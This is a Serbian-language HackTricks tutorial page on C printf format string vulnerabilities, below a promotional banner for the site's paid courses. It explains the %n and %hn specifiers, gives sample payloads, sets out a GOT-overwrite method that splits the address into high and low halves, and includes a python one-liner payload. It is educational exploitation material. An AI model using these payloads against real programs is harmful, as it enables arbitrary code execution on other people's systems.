# Formatiranje stringova

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **kompaniji za kibernetičku bezbednost**? Želite li da vidite svoju **kompaniju reklamiranu na HackTricks**? ili želite pristup **najnovijoj verziji PEASS-a ili preuzimanje HackTricks-a u PDF formatu**? Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitteru** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova** na [**hacktricks repozitorijum**](https://github.com/carlospolop/hacktricks) **i** [**hacktricks-cloud repozitorijum**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Osnovne informacije

U programskom jeziku C **`printf`** je funkcija koja se može koristiti za **ispisivanje** nekog stringa. **Prvi parametar** koji ova funkcija očekuje je **sirovi tekst sa formatima**. **Sledeći parametri** koji se očekuju su **vrednosti** koje će **zameniti** **formatere** iz sirovog teksta.

Ranjivost se pojavljuje kada **napadačev tekst bude postavljen kao prvi argument** ovoj funkciji. Napadač će moći da oblikuje **specijalan unos zloupotrebom** mogućnosti **printf formatiranja stringova** da **upiše bilo koje podatke na bilo koju adresu**. Na ovaj način, moći će da **izvrši proizvoljan kod**.

Formati:
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`** **upisuje** broj napisanih bajtova na **označenu adresu. Pisanje** toliko **bajtova** koliko je heksadecimalni broj koji **treba** napisati je način kako možete **napisati bilo koje podatke**.
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### **Tok eksploatacije**

Kao što je već objašnjeno, ova ranjivost omogućava **pisanje bilo čega na bilo koju adresu (proizvoljno pisanje).**

Cilj je **prepisati** **adresu** neke **funkcije** u **GOT** tabeli koja će biti pozvana kasnije. Idealno bi bilo postaviti **adresu na shellcode** koji se nalazi u izvršnom delu, ali je vrlo verovatno da nećete moći da napišete shellcode u izvršnom delu.\
Stoga, druga opcija je **prepisati** **funkciju** koja **prima** svoje **argumente** od **korisnika** i usmeriti je ka funkciji **`system`**.

Za pisanje adrese, obično se obavljaju 2 koraka: Prvo se **pišu 2 bajta** adrese, a zatim druga 2. Za to se koristi **`$hn`**.

**HOB** se odnosi na 2 viša bajta adrese\
**LOB** se odnosi na 2 niža bajta adrese

Zbog toga kako format string radi, prvo morate **najpre napisati manji** od \[HOB, LOB\] a zatim drugi.

Ako je HOB < LOB\
`[adresa+2][adresa]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

Ako je HOB > LOB\
`[adresa+2][adresa]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NºParam\_dir\_HOB LOB\_shell-HOB\_shell NºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

## Pwntools Šablon

Možete pronaći šablon za pripremu eksploata za ovu vrstu ranjivosti u:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}
